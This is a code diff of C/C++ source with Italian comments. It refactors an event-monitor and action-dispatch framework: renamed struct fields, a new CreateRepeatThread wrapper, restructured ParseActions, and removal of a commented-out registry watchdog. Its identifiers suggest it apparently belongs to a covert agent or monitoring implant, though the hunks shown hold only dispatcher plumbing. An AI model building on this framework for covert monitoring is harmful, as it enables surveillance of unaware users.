@@ -41,9 +41,9 @@ extern DWORD AM_GetAgentTag(const CHAR *agent_name);
 
 typedef struct  {
 	CHAR event_type[32];
-	EventMonitorAdd_t pEventMonitorAdd;
-	EventMonitorStart_t pEventMonitorStart;
-	EventMonitorStop_t pEventMonitorStop;
+	EventMonitorAdd_t add;
+	EventMonitorStart_t start;
+	EventMonitorStop_t stop;
 } EVENT_MONITOR;
 
 // Struttura per gestire i thread di ripetizione
@@ -90,7 +90,7 @@ static DWORD WINAPI RepeatThread(LPVOID lpParameter)
 }
 
 // Permette di gestire i repeat degli eventi
-void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD delay)
+static void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD delay)
 {
 	DWORD dummy;
 
@@ -113,6 +113,11 @@ void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD 
 	event_table[event_id].repeated_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RepeatThread, &event_table[event_id].repeated_event, 0, &dummy);
 }
 
+void CreateRepeatThread(DWORD event_id, EVENT_PARAM* param)
+{
+	CreateRepeatThread(event_id, param->repeat_action, param->count, param->delay);
+}
+
 void StopRepeatThread(DWORD event_id)
 {
 	// L'evento non e' riconosciuto
@@ -123,17 +128,17 @@ void StopRepeatThread(DWORD event_id)
 }
 
 // Registra un nuovo event monitor
-static void EventMonitorRegister(CHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
-						  EventMonitorStart_t pEventMonitorStart,
-						  EventMonitorStop_t pEventMonitorStop)
+static void EventMonitorRegister(CHAR *event_type, EventMonitorAdd_t add, 
+						  EventMonitorStart_t start,
+						  EventMonitorStop_t stop)
 {
 	if (_evt_monitor_count >= MAX_EVENT_MONITOR)
 		return;
 
 	sprintf_s(_evt_monitor[_evt_monitor_count].event_type, "%s", event_type);
-	_evt_monitor[_evt_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
-	_evt_monitor[_evt_monitor_count].pEventMonitorStop = pEventMonitorStop;
-	_evt_monitor[_evt_monitor_count].pEventMonitorStart = pEventMonitorStart;
+	_evt_monitor[_evt_monitor_count].add = add;
+	_evt_monitor[_evt_monitor_count].stop = stop;
+	_evt_monitor[_evt_monitor_count].start = start;
 
 	_evt_monitor_count++;
 }
@@ -142,16 +147,16 @@ void EventMonitorStartAll()
 {
 	DWORD i;
 	for (i=0; i<_evt_monitor_count; i++)
-		if (_evt_monitor[i].pEventMonitorStart)
-			_evt_monitor[i].pEventMonitorStart();
+		if (_evt_monitor[i].start)
+			_evt_monitor[i].start();
 }
 
 void EventMonitorStopAll()
 {
 	DWORD i;
 	for (i=0; i<_evt_monitor_count; i++)
-		if (_evt_monitor[i].pEventMonitorStop)
-			_evt_monitor[i].pEventMonitorStop();
+		if (_evt_monitor[i].stop)
+			_evt_monitor[i].stop();
 }
 
 static void EventTableInit()
@@ -187,7 +192,7 @@ void EventMonitorAddLine(const CHAR *event_type, cJSON* conf_json, EVENT_PARAM *
 
 	for (i=0; i<_evt_monitor_count; i++)
 		if (!stricmp(_evt_monitor[i].event_type, event_type)) {
-			_evt_monitor[i].pEventMonitorAdd(conf_json, event_param, event_id);
+			_evt_monitor[i].add(conf_json, event_param, event_id);
 			break;
 		}
 }
@@ -567,26 +572,25 @@ BYTE *ParseActionParameter(cJSON* conf_json, DWORD *tag)
 void WINAPI ParseActions(cJSON* conf_json, DWORD counter)
 {
 	cJSON* subaction_array = cJSON_GetObjectItem(conf_json, "subactions");
-	DWORD i;
 	DWORD tag;
-	BYTE *conf_ptr;
 
-	if (cJSON_IsArray(subaction_array)) {
-		cJSON* subaction = NULL;
-		i = 0;
+	if (!cJSON_IsArray(subaction_array))
+		return;
 
-		cJSON_ArrayForEach(subaction, subaction_array) {
-			if (cJSON_IsObject(subaction) == false)
-				continue;
+	cJSON* subaction = NULL;
 
-			conf_ptr = ParseActionParameter(subaction, &tag);
-			// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
-			// Basta una subaction slow per marcare tutto l'action
-			if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
-				EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
-				if (entry != NULL)
-					entry->is_fast_action = FALSE;
-			}
+	cJSON_ArrayForEach(subaction, subaction_array)
+	{
+		if (cJSON_IsObject(subaction) == false)
+			continue;
+
+		BYTE *conf_ptr = ParseActionParameter(subaction, &tag);
+		// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
+		// Basta una subaction slow per marcare tutto l'action
+		if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
+			EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
+			if (entry != NULL)
+				entry->is_fast_action = FALSE;
 		}
 	}
 }
@@ -676,7 +680,7 @@ void SM_AddExecutedProcess(DWORD pid)
 }
 
 // Loop di gestione delle azioni FAST
-DWORD WINAPI FastActionsThread(DWORD dummy)
+DWORD WINAPI FastActionsThread(LPVOID lpParameter)
 {
 	DWORD event_id;
 	LOOP {
@@ -729,10 +733,6 @@ void SM_MonitorEvents(DWORD dummy)
 
 	// Ciclo principale di lettura degli eventi
 	LOOP {
-		// Watchdog per la chiave nel registry (una volta ogni 10 cicli)
-		/*EVERY_N_CYCLES(10)
-			RegistryWatchdog();*/
-
 		// Gestisce la lista dei processi eseguiti
 		// (va eseguita per prima nel loop).
 		SM_HandleExecutedProcess();
